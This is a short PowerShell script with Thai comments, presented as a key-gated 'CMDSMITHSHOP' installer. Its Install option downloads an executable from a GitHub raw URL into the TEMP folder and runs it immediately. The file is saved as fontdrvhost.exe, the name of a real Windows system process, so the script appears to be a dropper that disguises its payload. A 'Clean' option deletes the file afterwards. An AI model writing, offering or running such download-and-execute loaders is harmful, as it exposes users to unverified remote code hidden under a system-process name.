
Clear-Host

# ===== CONFIG =====
$ValidKey = "smithshop"  # Key สำหรับรันโปรแกรม
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== CMDSMITHSHOP :] =====
Write-Host "=== CMDSMITHSHOP :] ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

switch ($choice) {
    "1" {
        $userKey = Read-Host "Enter your Key"

        if ($userKey.Trim() -eq $ValidKey) {
            Write-Host "✅ Key valid! Installing..."
            
            # ดาวน์โหลดไฟล์ exe
            Invoke-WebRequest $ExeURL -OutFile $ExeOutput
            
            # รันไฟล์ exe
            Start-Process $ExeOutput
            Write-Host "Installation complete ✅"
        } else {
            Write-Host "❌ Key invalid!" -ForegroundColor Red
        }
    }
    "2" {
        Write-Host "Cleaning..."
        if (Test-Path $ExeOutput) {
            Remove-Item $ExeOutput -Force
            Write-Host "File removed successfully ✅"
        } else {
            Write-Host "File not found ⚠️"
        }
    }
    default {
        Write-Host "Invalid choice ⚠️"
    }
}

Pause
